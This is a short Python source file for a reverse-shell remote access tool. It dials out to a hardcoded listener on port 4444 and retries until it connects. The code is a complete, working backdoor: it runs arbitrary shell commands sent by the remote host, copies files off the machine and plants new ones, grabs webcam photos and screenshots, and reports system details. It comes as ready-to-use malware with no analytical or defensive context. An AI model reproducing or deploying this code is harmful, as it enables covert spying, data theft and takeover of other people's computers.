import socket
import json
import subprocess
import os
import base64 
import time
import cv2
import tempfile
import numpy as np
from PIL import ImageGrab

def server(ip, port):
    global connection 
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            connection.connect((ip, port))
            break
        except ConnectionRefusedError:
            time.sleep(5)

def send(data):
    json_data = json.dumps(data)
    connection.send(json_data.encode('utf-8'))

def receive():
    json_data = '' 
    while True:
        try:
            json_data += connection.recv(1024).decode('utf-8')
            return json.loads(json_data)
        except ValueError:
            continue

def run():
    while True:
        command = receive()
        if command == 'exit':
            break
        elif command[:2] == 'cd' and len(command) > 1:
            os.chdir(command[3:])
        elif command [:8] == 'download':
            with open(command[9:], 'rb') as f:
                send(base64.b64encode(f.read()).decode('utf-8'))
        elif command[:6] == 'upload':
            with open(command[7:], 'wb') as f:
                file_data = receive()
                f.write(base64.b64decode(file_data))
        elif command == 'camera':
            try:
                cam = cv2.VideoCapture(0)
                ret, frame = cam.read()
                cam.release()
                if not ret:
                    send("Failed to access webcam.")
                    continue
                _, buffer = cv2.imencode('.png', frame)
                encoded_image = base64.b64encode(buffer).decode('utf-8')
                send(encoded_image)
            except Exception as e:
                send(f"Error: {str(e)}")        
        elif command == 'screenshot':
            try:
                img = ImageGrab.grab()
                with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tmp:
                    img.save(tmp.name, format='PNG')
                    with open(tmp.name, 'rb') as f:
                        send(base64.b64encode(f.read()).decode('utf-8'))
            except Exception as e:
                send(f"Screenshot error: {str(e)}")
        elif command == 'sysinfo':
            try:
                import platform
                import socket
                import psutil

                info = {
                        'Hostname': socket.gethostname(),
                        'IP Address': socket.gethostbyname(socket.gethostname()),
                        'OS': platform.system(),
                        'OS Version': platform.version(),
                        'Architecture': platform.machine(),
                        'Processor': platform.processor(),
                        'CPU Cores': psutil.cpu_count(logical=True),
                        'RAM': f"{round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB"
                    }
                send(json.dumps(info, indent=2))
            except Exception as e:
                send(f"[!] Failed to get system info: {str(e)}")
        else:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
            result = process.stdout.read() + process.stderr.read()
            send(result)

server('192.168.29.219', 4444) # use your ip address 
run()
